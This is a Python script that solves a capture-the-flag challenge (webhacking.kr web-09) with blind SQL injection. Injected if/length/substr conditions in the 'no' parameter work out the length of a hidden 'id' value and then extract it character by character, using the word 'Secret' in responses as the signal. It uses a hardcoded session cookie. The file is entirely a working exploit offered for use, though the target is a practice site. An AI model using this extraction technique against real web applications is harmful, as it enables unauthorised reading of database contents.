#!/usr/bin/python

import requests as req

url = "https://webhacking.kr/challenge/web-09/"
cookies = {"PHPSESSID":"1sufshmhf7a3l4p5pi8mh8nepq"}
ref = "Secret"
answer = ""

for a in range(1, 11+1):
    params = "?no=if(length(id)like({}),3,0)".format(a)
    requrl = url+params
    response = req.get(requrl, cookies=cookies)
    if ref in response.text:
        print("id length is \"{}\"".format(a))

for i in range(1, 11+1):
    for j in range(33, 126+1):
        if chr(j) == '%' or chr(j) == '_':
            continue
        key = hex(j)
        params = "?no=if(substr(id,{},1)like({}),3,0)".format(i, key)
        requrl = url+params
        response = req.get(requrl, cookies=cookies)
        if ref in response.text:
            answer += chr(j)

    
print("answer is \"{}\"".format(answer))